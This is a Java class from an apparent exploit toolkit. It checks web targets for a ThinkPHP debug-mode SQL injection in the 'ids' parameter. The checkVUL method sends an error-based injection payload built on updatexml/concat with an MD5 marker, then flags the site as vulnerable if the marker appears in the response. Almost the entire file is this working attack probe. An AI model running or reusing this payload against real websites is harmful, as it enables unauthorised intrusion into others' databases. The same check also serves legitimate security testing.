package com.leishianquan.exp;

import com.leishianquan.model.BasePayload;
import com.leishianquan.util.Dialog;
import com.leishianquan.util.HttpTool;

public class thinkphp_debug_index_ids_sqli implements BasePayload {
    private static final String CheckStr="cf67355a3333e6e143439161adc2d82";

    public boolean checkVUL(String url) throws Exception{
        try {
            String test_result = HttpTool.getHttpReuest(url + "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1", "utf-8");
            if(test_result.contains(CheckStr)){
                return true;}

        } catch (Exception e) {
//            Dialog.alert_Dialog("txf提示你",null,"连接超时");
        }
        return false;
    }


}